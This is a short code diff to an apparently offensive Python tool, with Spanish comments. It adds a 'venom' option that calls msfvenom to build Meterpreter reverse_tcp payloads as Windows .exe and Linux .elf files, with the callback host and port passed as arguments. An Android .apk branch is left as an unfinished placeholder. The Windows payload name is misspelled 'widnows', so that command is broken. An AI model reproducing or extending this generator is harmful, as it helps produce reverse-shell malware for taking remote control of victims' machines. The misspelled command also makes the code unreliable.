@@ -97,8 +97,13 @@ elif args.research == 'true':
 elif args.venom == 'true':
 
     if args.extension == '.exe':
-        os.system('')
-        # TERMINAR ESTA PARTE
+        os.system(f'msfvenom -p widnows/meterpreter/reverse_tcp LHOST={args.target} LPORT={args.port} -f exe > {args.name}.exe')
+
+    if args.extension == '.elf':
+        os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={args.target} LPORT={args.port} -f elf > {args.name}.elf')
+
+    if args.extension == '.apk':
+        os.system('TERMINAR ESTO')
 
 else:
     print('\n[*] Error: Revisa si has añadido todos los argumentos necesarios.\n')
